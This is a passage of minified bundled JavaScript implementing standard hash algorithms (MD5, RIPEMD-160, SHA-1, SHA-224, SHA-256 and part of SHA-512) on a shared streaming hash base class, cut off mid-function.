      , j = requireInherits_browser();
    function O(w, b) {
        if (!_.isBuffer(w) && typeof w != "string")
            throw new TypeError(b + " must be a string or a buffer")
    }
    function x(w) {
        M.call(this),
        this._block = _.allocUnsafe(w),
        this._blockSize = w,
        this._blockOffset = 0,
        this._length = [0, 0, 0, 0],
        this._finalized = !1
    }
    return j(x, M),
    x.prototype._transform = function(w, b, X) {
        var Y = null;
        try {
            this.update(w, b)
        } catch (F) {
            Y = F
        }
        X(Y)
    }
    ,
    x.prototype._flush = function(w) {
        var b = null;
        try {
            this.push(this.digest())
        } catch (X) {
            b = X
        }
        w(b)
    }
    ,
    x.prototype.update = function(w, b) {
        if (O(w, "Data"),
        this._finalized)
            throw new Error("Digest already called");
        _.isBuffer(w) || (w = _.from(w, b));
        for (var X = this._block, Y = 0; this._blockOffset + w.length - Y >= this._blockSize; ) {
            for (var F = this._blockOffset; F < this._blockSize; )
                X[F++] = w[Y++];
            this._update(),
            this._blockOffset = 0
        }
        for (; Y < w.length; )
            X[this._blockOffset++] = w[Y++];
        for (var V = 0, K = w.length * 8; K > 0; ++V)
            this._length[V] += K,
            K = this._length[V] / 4294967296 | 0,
            K > 0 && (this._length[V] -= 4294967296 * K);
        return this
    }
    ,
    x.prototype._update = function() {
        throw new Error("_update is not implemented")
    }
    ,
    x.prototype.digest = function(w) {
        if (this._finalized)
            throw new Error("Digest already called");
        this._finalized = !0;
        var b = this._digest();
        w !== void 0 && (b = b.toString(w)),
        this._block.fill(0),
        this._blockOffset = 0;
        for (var X = 0; X < 4; ++X)
            this._length[X] = 0;
        return b
    }
    ,
    x.prototype._digest = function() {
        throw new Error("_digest is not implemented")
    }
    ,
    hashBase = x,
    hashBase
}
var md5_js, hasRequiredMd5_js;
function requireMd5_js() {
    if (hasRequiredMd5_js)
        return md5_js;
    hasRequiredMd5_js = 1;
    var _ = requireInherits_browser()
      , M = requireHashBase()
      , j = requireSafeBuffer$1().Buffer
      , O = new Array(16);
    function x() {
        M.call(this, 64),
        this._a = 1732584193,
        this._b = 4023233417,
        this._c = 2562383102,
        this._d = 271733878
    }
    _(x, M),
    x.prototype._update = function() {
        for (var V = O, K = 0; K < 16; ++K)
            V[K] = this._block.readInt32LE(K * 4);
        var Q = this._a
          , ee = this._b
          , ae = this._c
          , ne = this._d;
        Q = b(Q, ee, ae, ne, V[0], 3614090360, 7),
        ne = b(ne, Q, ee, ae, V[1], 3905402710, 12),
        ae = b(ae, ne, Q, ee, V[2], 606105819, 17),
        ee = b(ee, ae, ne, Q, V[3], 3250441966, 22),
        Q = b(Q, ee, ae, ne, V[4], 4118548399, 7),
        ne = b(ne, Q, ee, ae, V[5], 1200080426, 12),
        ae = b(ae, ne, Q, ee, V[6], 2821735955, 17),
        ee = b(ee, ae, ne, Q, V[7], 4249261313, 22),
        Q = b(Q, ee, ae, ne, V[8], 1770035416, 7),
        ne = b(ne, Q, ee, ae, V[9], 2336552879, 12),
        ae = b(ae, ne, Q, ee, V[10], 4294925233, 17),
        ee = b(ee, ae, ne, Q, V[11], 2304563134, 22),
        Q = b(Q, ee, ae, ne, V[12], 1804603682, 7),
        ne = b(ne, Q, ee, ae, V[13], 4254626195, 12),
        ae = b(ae, ne, Q, ee, V[14], 2792965006, 17),
        ee = b(ee, ae, ne, Q, V[15], 1236535329, 22),
        Q = X(Q, ee, ae, ne, V[1], 4129170786, 5),
        ne = X(ne, Q, ee, ae, V[6], 3225465664, 9),
        ae = X(ae, ne, Q, ee, V[11], 643717713, 14),
        ee = X(ee, ae, ne, Q, V[0], 3921069994, 20),
        Q = X(Q, ee, ae, ne, V[5], 3593408605, 5),
        ne = X(ne, Q, ee, ae, V[10], 38016083, 9),
        ae = X(ae, ne, Q, ee, V[15], 3634488961, 14),
        ee = X(ee, ae, ne, Q, V[4], 3889429448, 20),
        Q = X(Q, ee, ae, ne, V[9], 568446438, 5),
        ne = X(ne, Q, ee, ae, V[14], 3275163606, 9),
        ae = X(ae, ne, Q, ee, V[3], 4107603335, 14),
        ee = X(ee, ae, ne, Q, V[8], 1163531501, 20),
        Q = X(Q, ee, ae, ne, V[13], 2850285829, 5),
        ne = X(ne, Q, ee, ae, V[2], 4243563512, 9),
        ae = X(ae, ne, Q, ee, V[7], 1735328473, 14),
        ee = X(ee, ae, ne, Q, V[12], 2368359562, 20),
        Q = Y(Q, ee, ae, ne, V[5], 4294588738, 4),
        ne = Y(ne, Q, ee, ae, V[8], 2272392833, 11),
        ae = Y(ae, ne, Q, ee, V[11], 1839030562, 16),
        ee = Y(ee, ae, ne, Q, V[14], 4259657740, 23),
        Q = Y(Q, ee, ae, ne, V[1], 2763975236, 4),
        ne = Y(ne, Q, ee, ae, V[4], 1272893353, 11),
        ae = Y(ae, ne, Q, ee, V[7], 4139469664, 16),
        ee = Y(ee, ae, ne, Q, V[10], 3200236656, 23),
        Q = Y(Q, ee, ae, ne, V[13], 681279174, 4),
        ne = Y(ne, Q, ee, ae, V[0], 3936430074, 11),
        ae = Y(ae, ne, Q, ee, V[3], 3572445317, 16),
        ee = Y(ee, ae, ne, Q, V[6], 76029189, 23),
        Q = Y(Q, ee, ae, ne, V[9], 3654602809, 4),
        ne = Y(ne, Q, ee, ae, V[12], 3873151461, 11),
        ae = Y(ae, ne, Q, ee, V[15], 530742520, 16),
        ee = Y(ee, ae, ne, Q, V[2], 3299628645, 23),
        Q = F(Q, ee, ae, ne, V[0], 4096336452, 6),
        ne = F(ne, Q, ee, ae, V[7], 1126891415, 10),
        ae = F(ae, ne, Q, ee, V[14], 2878612391, 15),
        ee = F(ee, ae, ne, Q, V[5], 4237533241, 21),
        Q = F(Q, ee, ae, ne, V[12], 1700485571, 6),
        ne = F(ne, Q, ee, ae, V[3], 2399980690, 10),
        ae = F(ae, ne, Q, ee, V[10], 4293915773, 15),
        ee = F(ee, ae, ne, Q, V[1], 2240044497, 21),
        Q = F(Q, ee, ae, ne, V[8], 1873313359, 6),
        ne = F(ne, Q, ee, ae, V[15], 4264355552, 10),
        ae = F(ae, ne, Q, ee, V[6], 2734768916, 15),
        ee = F(ee, ae, ne, Q, V[13], 1309151649, 21),
        Q = F(Q, ee, ae, ne, V[4], 4149444226, 6),
        ne = F(ne, Q, ee, ae, V[11], 3174756917, 10),
        ae = F(ae, ne, Q, ee, V[2], 718787259, 15),
        ee = F(ee, ae, ne, Q, V[9], 3951481745, 21),
        this._a = this._a + Q | 0,
        this._b = this._b + ee | 0,
        this._c = this._c + ae | 0,
        this._d = this._d + ne | 0
    }
    ,
    x.prototype._digest = function() {
        this._block[this._blockOffset++] = 128,
        this._blockOffset > 56 && (this._block.fill(0, this._blockOffset, 64),
        this._update(),
        this._blockOffset = 0),
        this._block.fill(0, this._blockOffset, 56),
        this._block.writeUInt32LE(this._length[0], 56),
        this._block.writeUInt32LE(this._length[1], 60),
        this._update();
        var V = j.allocUnsafe(16);
        return V.writeInt32LE(this._a, 0),
        V.writeInt32LE(this._b, 4),
        V.writeInt32LE(this._c, 8),
        V.writeInt32LE(this._d, 12),
        V
    }
    ;
    function w(V, K) {
        return V << K | V >>> 32 - K
    }
    function b(V, K, Q, ee, ae, ne, oe) {
        return w(V + (K & Q | ~K & ee) + ae + ne | 0, oe) + K | 0
    }
    function X(V, K, Q, ee, ae, ne, oe) {
        return w(V + (K & ee | Q & ~ee) + ae + ne | 0, oe) + K | 0
    }
    function Y(V, K, Q, ee, ae, ne, oe) {
        return w(V + (K ^ Q ^ ee) + ae + ne | 0, oe) + K | 0
    }
    function F(V, K, Q, ee, ae, ne, oe) {
        return w(V + (Q ^ (K | ~ee)) + ae + ne | 0, oe) + K | 0
    }
    return md5_js = x,
    md5_js
}
var md5, hasRequiredMd5;
function requireMd5() {
    if (hasRequiredMd5)
        return md5;
    hasRequiredMd5 = 1;
    var _ = requireMd5_js();
    return md5 = function(M) {
        return new _().update(M).digest()
    }
    ,
    md5
}
var ripemd160, hasRequiredRipemd160;
function requireRipemd160() {
    if (hasRequiredRipemd160)
        return ripemd160;
    hasRequiredRipemd160 = 1;
    var _ = requireDist$4().Buffer
      , M = requireInherits_browser()
      , j = requireHashBase()
      , O = new Array(16)
      , x = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8, 3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12, 1, 9, 11, 10, 0, 8, 12, 4, 13, 3, 7, 15, 14, 5, 6, 2, 4, 0, 5, 9, 7, 12, 2, 10, 14, 1, 3, 8, 11, 6, 15, 13]
      , w = [5, 14, 7, 0, 9, 2, 11, 4, 13, 6, 15, 8, 1, 10, 3, 12, 6, 11, 3, 7, 0, 13, 5, 10, 14, 15, 8, 12, 4, 9, 1, 2, 15, 5, 1, 3, 7, 14, 6, 9, 11, 8, 12, 2, 10, 0, 4, 13, 8, 6, 4, 1, 3, 11, 15, 0, 5, 12, 2, 13, 9, 7, 10, 14, 12, 15, 10, 4, 1, 5, 8, 7, 6, 2, 13, 14, 0, 3, 9, 11]
      , b = [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8, 7, 6, 8, 13, 11, 9, 7, 15, 7, 12, 15, 9, 11, 7, 13, 12, 11, 13, 6, 7, 14, 9, 13, 15, 14, 8, 13, 6, 5, 12, 7, 5, 11, 12, 14, 15, 14, 15, 9, 8, 9, 14, 5, 6, 8, 6, 5, 12, 9, 15, 5, 11, 6, 8, 13, 12, 5, 12, 13, 14, 11, 8, 5, 6]
      , X = [8, 9, 9, 11, 13, 15, 15, 5, 7, 7, 8, 11, 14, 14, 12, 6, 9, 13, 15, 7, 12, 8, 9, 11, 7, 7, 12, 7, 6, 15, 13, 11, 9, 7, 15, 11, 8, 6, 6, 14, 12, 13, 5, 14, 13, 13, 7, 5, 15, 5, 8, 11, 14, 14, 6, 14, 6, 9, 12, 9, 12, 5, 15, 8, 8, 5, 12, 9, 12, 5, 14, 6, 8, 13, 6, 5, 15, 13, 11, 11]
      , Y = [0, 1518500249, 1859775393, 2400959708, 2840853838]
      , F = [1352829926, 1548603684, 1836072691, 2053994217, 0];
    function V() {
        j.call(this, 64),
        this._a = 1732584193,
        this._b = 4023233417,
        this._c = 2562383102,
        this._d = 271733878,
        this._e = 3285377520
    }
    M(V, j),
    V.prototype._update = function() {
        for (var ue = O, fe = 0; fe < 16; ++fe)
            ue[fe] = this._block.readInt32LE(fe * 4);
        for (var he = this._a | 0, pe = this._b | 0, ye = this._c | 0, be = this._d | 0, xe = this._e | 0, Ae = this._a | 0, Ee = this._b | 0, Be = this._c | 0, ce = this._d | 0, q = this._e | 0, L = 0; L < 80; L += 1) {
            var U, Z;
            L < 16 ? (U = Q(he, pe, ye, be, xe, ue[x[L]], Y[0], b[L]),
            Z = oe(Ae, Ee, Be, ce, q, ue[w[L]], F[0], X[L])) : L < 32 ? (U = ee(he, pe, ye, be, xe, ue[x[L]], Y[1], b[L]),
            Z = ne(Ae, Ee, Be, ce, q, ue[w[L]], F[1], X[L])) : L < 48 ? (U = ae(he, pe, ye, be, xe, ue[x[L]], Y[2], b[L]),
            Z = ae(Ae, Ee, Be, ce, q, ue[w[L]], F[2], X[L])) : L < 64 ? (U = ne(he, pe, ye, be, xe, ue[x[L]], Y[3], b[L]),
            Z = ee(Ae, Ee, Be, ce, q, ue[w[L]], F[3], X[L])) : (U = oe(he, pe, ye, be, xe, ue[x[L]], Y[4], b[L]),
            Z = Q(Ae, Ee, Be, ce, q, ue[w[L]], F[4], X[L])),
            he = xe,
            xe = be,
            be = K(ye, 10),
            ye = pe,
            pe = U,
            Ae = q,
            q = ce,
            ce = K(Be, 10),
            Be = Ee,
            Ee = Z
        }
        var te = this._b + ye + ce | 0;
        this._b = this._c + be + q | 0,
        this._c = this._d + xe + Ae | 0,
        this._d = this._e + he + Ee | 0,
        this._e = this._a + pe + Be | 0,
        this._a = te
    }
    ,
    V.prototype._digest = function() {
        this._block[this._blockOffset++] = 128,
        this._blockOffset > 56 && (this._block.fill(0, this._blockOffset, 64),
        this._update(),
        this._blockOffset = 0),
        this._block.fill(0, this._blockOffset, 56),
        this._block.writeUInt32LE(this._length[0], 56),
        this._block.writeUInt32LE(this._length[1], 60),
        this._update();
        var ue = _.alloc ? _.alloc(20) : new _(20);
        return ue.writeInt32LE(this._a, 0),
        ue.writeInt32LE(this._b, 4),
        ue.writeInt32LE(this._c, 8),
        ue.writeInt32LE(this._d, 12),
        ue.writeInt32LE(this._e, 16),
        ue
    }
    ;
    function K(ue, fe) {
        return ue << fe | ue >>> 32 - fe
    }
    function Q(ue, fe, he, pe, ye, be, xe, Ae) {
        return K(ue + (fe ^ he ^ pe) + be + xe | 0, Ae) + ye | 0
    }
    function ee(ue, fe, he, pe, ye, be, xe, Ae) {
        return K(ue + (fe & he | ~fe & pe) + be + xe | 0, Ae) + ye | 0
    }
    function ae(ue, fe, he, pe, ye, be, xe, Ae) {
        return K(ue + ((fe | ~he) ^ pe) + be + xe | 0, Ae) + ye | 0
    }
    function ne(ue, fe, he, pe, ye, be, xe, Ae) {
        return K(ue + (fe & pe | he & ~pe) + be + xe | 0, Ae) + ye | 0
    }
    function oe(ue, fe, he, pe, ye, be, xe, Ae) {
        return K(ue + (fe ^ (he | ~pe)) + be + xe | 0, Ae) + ye | 0
    }
    return ripemd160 = V,
    ripemd160
}
var sha_js = {
    exports: {}
}, hash$1, hasRequiredHash$1;
function requireHash$1() {
    if (hasRequiredHash$1)
        return hash$1;
    hasRequiredHash$1 = 1;
    var _ = requireSafeBuffer$1().Buffer;
    function M(j, O) {
        this._block = _.alloc(j),
        this._finalSize = O,
        this._blockSize = j,
        this._len = 0
    }
    return M.prototype.update = function(j, O) {
        typeof j == "string" && (O = O || "utf8",
        j = _.from(j, O));
        for (var x = this._block, w = this._blockSize, b = j.length, X = this._len, Y = 0; Y < b; ) {
            for (var F = X % w, V = Math.min(b - Y, w - F), K = 0; K < V; K++)
                x[F + K] = j[Y + K];
            X += V,
            Y += V,
            X % w === 0 && this._update(x)
        }
        return this._len += b,
        this
    }
    ,
    M.prototype.digest = function(j) {
        var O = this._len % this._blockSize;
        this._block[O] = 128,
        this._block.fill(0, O + 1),
        O >= this._finalSize && (this._update(this._block),
        this._block.fill(0));
        var x = this._len * 8;
        if (x <= 4294967295)
            this._block.writeUInt32BE(x, this._blockSize - 4);
        else {
            var w = (x & 4294967295) >>> 0
              , b = (x - w) / 4294967296;
            this._block.writeUInt32BE(b, this._blockSize - 8),
            this._block.writeUInt32BE(w, this._blockSize - 4)
        }
        this._update(this._block);
        var X = this._hash();
        return j ? X.toString(j) : X
    }
    ,
    M.prototype._update = function() {
        throw new Error("_update must be implemented by subclass")
    }
    ,
    hash$1 = M,
    hash$1
}
var sha$1, hasRequiredSha$1;
function requireSha$1() {
    if (hasRequiredSha$1)
        return sha$1;
    hasRequiredSha$1 = 1;
    var _ = requireInherits_browser()
      , M = requireHash$1()
      , j = requireSafeBuffer$1().Buffer
      , O = [1518500249, 1859775393, -1894007588, -899497514]
      , x = new Array(80);
    function w() {
        this.init(),
        this._w = x,
        M.call(this, 64, 56)
    }
    _(w, M),
    w.prototype.init = function() {
        return this._a = 1732584193,
        this._b = 4023233417,
        this._c = 2562383102,
        this._d = 271733878,
        this._e = 3285377520,
        this
    }
    ;
    function b(F) {
        return F << 5 | F >>> 27
    }
    function X(F) {
        return F << 30 | F >>> 2
    }
    function Y(F, V, K, Q) {
        return F === 0 ? V & K | ~V & Q : F === 2 ? V & K | V & Q | K & Q : V ^ K ^ Q
    }
    return w.prototype._update = function(F) {
        for (var V = this._w, K = this._a | 0, Q = this._b | 0, ee = this._c | 0, ae = this._d | 0, ne = this._e | 0, oe = 0; oe < 16; ++oe)
            V[oe] = F.readInt32BE(oe * 4);
        for (; oe < 80; ++oe)
            V[oe] = V[oe - 3] ^ V[oe - 8] ^ V[oe - 14] ^ V[oe - 16];
        for (var ue = 0; ue < 80; ++ue) {
            var fe = ~~(ue / 20)
              , he = b(K) + Y(fe, Q, ee, ae) + ne + V[ue] + O[fe] | 0;
            ne = ae,
            ae = ee,
            ee = X(Q),
            Q = K,
            K = he
        }
        this._a = K + this._a | 0,
        this._b = Q + this._b | 0,
        this._c = ee + this._c | 0,
        this._d = ae + this._d | 0,
        this._e = ne + this._e | 0
    }
    ,
    w.prototype._hash = function() {
        var F = j.allocUnsafe(20);
        return F.writeInt32BE(this._a | 0, 0),
        F.writeInt32BE(this._b | 0, 4),
        F.writeInt32BE(this._c | 0, 8),
        F.writeInt32BE(this._d | 0, 12),
        F.writeInt32BE(this._e | 0, 16),
        F
    }
    ,
    sha$1 = w,
    sha$1
}
var sha1, hasRequiredSha1;
function requireSha1() {
    if (hasRequiredSha1)
        return sha1;
    hasRequiredSha1 = 1;
    var _ = requireInherits_browser()
      , M = requireHash$1()
      , j = requireSafeBuffer$1().Buffer
      , O = [1518500249, 1859775393, -1894007588, -899497514]
      , x = new Array(80);
    function w() {
        this.init(),
        this._w = x,
        M.call(this, 64, 56)
    }
    _(w, M),
    w.prototype.init = function() {
        return this._a = 1732584193,
        this._b = 4023233417,
        this._c = 2562383102,
        this._d = 271733878,
        this._e = 3285377520,
        this
    }
    ;
    function b(V) {
        return V << 1 | V >>> 31
    }
    function X(V) {
        return V << 5 | V >>> 27
    }
    function Y(V) {
        return V << 30 | V >>> 2
    }
    function F(V, K, Q, ee) {
        return V === 0 ? K & Q | ~K & ee : V === 2 ? K & Q | K & ee | Q & ee : K ^ Q ^ ee
    }
    return w.prototype._update = function(V) {
        for (var K = this._w, Q = this._a | 0, ee = this._b | 0, ae = this._c | 0, ne = this._d | 0, oe = this._e | 0, ue = 0; ue < 16; ++ue)
            K[ue] = V.readInt32BE(ue * 4);
        for (; ue < 80; ++ue)
            K[ue] = b(K[ue - 3] ^ K[ue - 8] ^ K[ue - 14] ^ K[ue - 16]);
        for (var fe = 0; fe < 80; ++fe) {
            var he = ~~(fe / 20)
              , pe = X(Q) + F(he, ee, ae, ne) + oe + K[fe] + O[he] | 0;
            oe = ne,
            ne = ae,
            ae = Y(ee),
            ee = Q,
            Q = pe
        }
        this._a = Q + this._a | 0,
        this._b = ee + this._b | 0,
        this._c = ae + this._c | 0,
        this._d = ne + this._d | 0,
        this._e = oe + this._e | 0
    }
    ,
    w.prototype._hash = function() {
        var V = j.allocUnsafe(20);
        return V.writeInt32BE(this._a | 0, 0),
        V.writeInt32BE(this._b | 0, 4),
        V.writeInt32BE(this._c | 0, 8),
        V.writeInt32BE(this._d | 0, 12),
        V.writeInt32BE(this._e | 0, 16),
        V
    }
    ,
    sha1 = w,
    sha1
}
var sha256$1, hasRequiredSha256;
function requireSha256() {
    if (hasRequiredSha256)
        return sha256$1;
    hasRequiredSha256 = 1;
    var _ = requireInherits_browser()
      , M = requireHash$1()
      , j = requireSafeBuffer$1().Buffer
      , O = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298]
      , x = new Array(64);
    function w() {
        this.init(),
        this._w = x,
        M.call(this, 64, 56)
    }
    _(w, M),
    w.prototype.init = function() {
        return this._a = 1779033703,
        this._b = 3144134277,
        this._c = 1013904242,
        this._d = 2773480762,
        this._e = 1359893119,
        this._f = 2600822924,
        this._g = 528734635,
        this._h = 1541459225,
        this
    }
    ;
    function b(Q, ee, ae) {
        return ae ^ Q & (ee ^ ae)
    }
    function X(Q, ee, ae) {
        return Q & ee | ae & (Q | ee)
    }
    function Y(Q) {
        return (Q >>> 2 | Q << 30) ^ (Q >>> 13 | Q << 19) ^ (Q >>> 22 | Q << 10)
    }
    function F(Q) {
        return (Q >>> 6 | Q << 26) ^ (Q >>> 11 | Q << 21) ^ (Q >>> 25 | Q << 7)
    }
    function V(Q) {
        return (Q >>> 7 | Q << 25) ^ (Q >>> 18 | Q << 14) ^ Q >>> 3
    }
    function K(Q) {
        return (Q >>> 17 | Q << 15) ^ (Q >>> 19 | Q << 13) ^ Q >>> 10
    }
    return w.prototype._update = function(Q) {
        for (var ee = this._w, ae = this._a | 0, ne = this._b | 0, oe = this._c | 0, ue = this._d | 0, fe = this._e | 0, he = this._f | 0, pe = this._g | 0, ye = this._h | 0, be = 0; be < 16; ++be)
            ee[be] = Q.readInt32BE(be * 4);
        for (; be < 64; ++be)
            ee[be] = K(ee[be - 2]) + ee[be - 7] + V(ee[be - 15]) + ee[be - 16] | 0;
        for (var xe = 0; xe < 64; ++xe) {
            var Ae = ye + F(fe) + b(fe, he, pe) + O[xe] + ee[xe] | 0
              , Ee = Y(ae) + X(ae, ne, oe) | 0;
            ye = pe,
            pe = he,
            he = fe,
            fe = ue + Ae | 0,
            ue = oe,
            oe = ne,
            ne = ae,
            ae = Ae + Ee | 0
        }
        this._a = ae + this._a | 0,
        this._b = ne + this._b | 0,
        this._c = oe + this._c | 0,
        this._d = ue + this._d | 0,
        this._e = fe + this._e | 0,
        this._f = he + this._f | 0,
        this._g = pe + this._g | 0,
        this._h = ye + this._h | 0
    }
    ,
    w.prototype._hash = function() {
        var Q = j.allocUnsafe(32);
        return Q.writeInt32BE(this._a, 0),
        Q.writeInt32BE(this._b, 4),
        Q.writeInt32BE(this._c, 8),
        Q.writeInt32BE(this._d, 12),
        Q.writeInt32BE(this._e, 16),
        Q.writeInt32BE(this._f, 20),
        Q.writeInt32BE(this._g, 24),
        Q.writeInt32BE(this._h, 28),
        Q
    }
    ,
    sha256$1 = w,
    sha256$1
}
var sha224$1, hasRequiredSha224;
function requireSha224() {
    if (hasRequiredSha224)
        return sha224$1;
    hasRequiredSha224 = 1;
    var _ = requireInherits_browser()
      , M = requireSha256()
      , j = requireHash$1()
      , O = requireSafeBuffer$1().Buffer
      , x = new Array(64);
    function w() {
        this.init(),
        this._w = x,
        j.call(this, 64, 56)
    }
    return _(w, M),
    w.prototype.init = function() {
        return this._a = 3238371032,
        this._b = 914150663,
        this._c = 812702999,
        this._d = 4144912697,
        this._e = 4290775857,
        this._f = 1750603025,
        this._g = 1694076839,
        this._h = 3204075428,
        this
    }
    ,
    w.prototype._hash = function() {
        var b = O.allocUnsafe(28);
        return b.writeInt32BE(this._a, 0),
        b.writeInt32BE(this._b, 4),
        b.writeInt32BE(this._c, 8),
        b.writeInt32BE(this._d, 12),
        b.writeInt32BE(this._e, 16),
        b.writeInt32BE(this._f, 20),
        b.writeInt32BE(this._g, 24),
        b
    }
    ,
    sha224$1 = w,
    sha224$1
}
var sha512$1, hasRequiredSha512;
function requireSha512() {
    if (hasRequiredSha512)
        return sha512$1;
    hasRequiredSha512 = 1;
    var _ = requireInherits_browser()
      , M = requireHash$1()
      , j = requireSafeBuffer$1().Buffer
      , O = [1116352408, 3609767458, 1899447441, 602891725, 3049323471, 3964484399, 3921009573, 2173295548, 961987163, 4081628472, 1508970993, 3053834265, 2453635748, 2937671579, 2870763221, 3664609560, 3624381080, 2734883394, 310598401, 1164996542, 607225278, 1323610764, 1426881987, 3590304994, 1925078388, 4068182383, 2162078206, 991336113, 2614888103, 633803317, 3248222580, 3479774868, 3835390401, 2666613458, 4022224774, 944711139, 264347078, 2341262773, 604807628, 2007800933, 770255983, 1495990901, 1249150122, 1856431235, 1555081692, 3175218132, 1996064986, 2198950837, 2554220882, 3999719339, 2821834349, 766784016, 2952996808, 2566594879, 3210313671, 3203337956, 3336571891, 1034457026, 3584528711, 2466948901, 113926993, 3758326383, 338241895, 168717936, 666307205, 1188179964, 773529912, 1546045734, 1294757372, 1522805485, 1396182291, 2643833823, 1695183700, 2343527390, 1986661051, 1014477480, 2177026350, 1206759142, 2456956037, 344077627, 2730485921, 1290863460, 2820302411, 3158454273, 3259730800, 3505952657, 3345764771, 106217008, 3516065817, 3606008344, 3600352804, 1432725776, 4094571909, 1467031594, 275423344, 851169720, 430227734, 3100823752, 506948616, 1363258195, 659060556, 3750685593, 883997877, 3785050280, 958139571, 3318307427, 1322822218, 3812723403, 1537002063, 2003034995, 1747873779, 3602036899, 1955562222, 1575990012, 2024104815, 1125592928, 2227730452, 2716904306, 2361852424, 442776044, 2428436474, 593698344, 2756734187, 3733110249, 3204031479, 2999351573, 3329325298, 3815920427, 3391569614, 3928383900, 3515267271, 566280711, 3940187606, 3454069534, 4118630271, 4000239992, 116418474, 1914138554, 174292421, 2731055270, 289380356, 3203993006, 460393269, 320620315, 685471733, 587496836, 852142971, 1086792851, 1017036298, 365543100, 1126000580, 2618297676, 1288033470, 3409855158, 1501505948, 4234509866, 1607167915, 987167468, 1816402316, 1246189591]
      , x = new Array(160);
    function w() {
        this.init(),
        this._w = x,
        M.call(this, 128, 112)
    }
    _(w, M),
    w.prototype.init = function() {
        return this._ah = 1779033703,
        this._bh = 3144134277,
        this._ch = 1013904242,
        this._dh = 2773480762,
        this._eh = 1359893119,
        this._fh = 2600822924,
        this._gh = 528734635,
        this._hh = 1541459225,
        this._al = 4089235720,
        this._bl = 2227873595,
        this._cl = 4271175723,
        this._dl = 1595750129,
        this._el = 2917565137,
        this._fl = 725511199,
        this._gl = 4215389547,
        this._hl = 327033209,
        this
    }
    ;
    function b(ne, oe, ue) {
        return ue ^ ne & (oe ^ ue)
    }
    function X(ne, oe, ue) {
        return ne & oe | ue & (ne | oe)
    }
    function Y(ne, oe) {
        return (ne >>> 28 | oe << 4) ^ (oe >>> 2 | ne << 30) ^ (oe >>> 7 | ne << 25)
    }
    function F(ne, oe) {
        return (ne >>> 14 | oe << 18) ^ (ne >>> 18 | oe << 14) ^ (oe >>> 9 | ne << 23)
    }
    function V(ne, oe) {
        return (ne >>> 1 | oe << 31) ^ (ne >>> 8 | oe << 24) ^ ne >>> 7
    }
    function K(ne, oe) {
        return (ne >>> 1 | oe << 31) ^ (ne >>> 8 | oe << 24) ^ (ne >>> 7 | oe << 25)
    }
    function Q(ne, oe) {
        return (ne >>> 19 | oe << 13) ^ (oe >>> 29 | ne << 3) ^ ne >>> 6
    }
    function ee(ne, oe) {
        return (ne >>> 19 | oe << 13) ^ (oe >>> 29 | ne << 3) ^ (ne >>> 6 | oe << 26)
    }
    function ae(ne, oe) {
        return ne >>> 0 < oe >>> 0 ? 1 : 0
    }
    return w.prototype._update = function(ne) {
        for (var oe = this._w, ue = this._ah | 0, fe = this._bh | 0, he = this._ch | 0, pe = this._dh | 0, ye = this._eh | 0, be = this._fh | 0, xe = this._gh | 0, Ae = this._hh | 0, Ee = this._al | 0, Be = this._bl | 0, ce = this._cl | 0, q = this._dl | 0, L = this._el | 0, U = this._fl | 0, Z = this._gl | 0, te = this._hl | 0, se = 0; se < 32; se += 2)
            oe[se] = ne.readInt32BE(se * 4),
            oe[se + 1] = ne.readInt32BE(se * 4 + 4);
        for (; se < 160; se += 2) {
            var de = oe[se - 30]
              , re = oe[se - 15 * 2 + 1]
              , $ = V(de, re)
              , ie = K(re, de);
            de = oe[se - 2 * 2],
            re = oe[se - 2 * 2 + 1];
            var ve = Q(de, re)
              , ge = ee(re, de)
              , Re = oe[se - 7 * 2]
              , Pe = oe[se - 7 * 2 + 1]
              , Ie = oe[se - 16 * 2]
              , Te = oe[se - 16 * 2 + 1]
              , Le = ie + Pe | 0
              , Ze = $ + Re + ae(Le, ie) | 0;
            Le = Le + ge | 0,
            Ze = Ze + ve + ae(Le, ge) | 0,
            Le = Le + Te | 0,
            Ze = Ze + Ie + ae(Le, Te) | 0,
            oe[se] = Ze,
            oe[se + 1] = Le
        }
        for (var $e = 0; $e < 160; $e += 2) {
            Ze = oe[$e],
            Le = oe[$e + 1];
            var Ne = X(ue, fe, he)
              , qe = X(Ee, Be, ce)
              , Ve = Y(ue, Ee)
              , lt = Y(Ee, ue)
              , nt = F(ye, L)
              , je = F(L, ye)
              , Ke = O[$e]
              , Qe = O[$e + 1]
              , We = b(ye, be, xe)
              , mt = b(L, U, Z)
              , ct = te + je | 0
              , vt = Ae + nt + ae(ct, te) | 0;
            ct = ct + mt | 0,
            vt = vt + We + ae(ct, mt) | 0,
            ct = ct + Qe | 0,
            vt = vt + Ke + ae(ct, Qe) | 0,
            ct = ct + Le | 0,
            vt = vt + Ze + ae(ct, Le) | 0;
            var we = lt + qe | 0
              , _e = Ve + Ne + ae(we, lt) | 0;
            Ae = xe,
            te = Z,
            xe = be,
            Z = U,
            be = ye,
            U = L,
            L = q + ct | 0,
            ye = pe + vt + ae(L, q) | 0,
            pe = he,
            q = ce,
            he = fe,
            ce = Be,
            fe = ue,
            Be = Ee,
            Ee = ct + we | 0,
            ue = vt + _e + ae(Ee, ct) | 0
        }
        this._al = this._al + Ee | 0,
        this._bl = this._bl + Be | 0,
        this._cl = this._cl + ce | 0,
        this._dl = this._dl + q | 0,
        this._el = this._el + L | 0,
        this._fl = this._fl + U | 0,
        this._gl = this._gl + Z | 0,
        this._hl = this._hl + te | 0,
        this._ah = this._ah + ue + ae(this._al, Ee) | 0,
        this._bh = this._bh + fe + ae(this._bl, Be) | 0,
        this._ch = this._ch + he + ae(this._cl, ce) | 0,
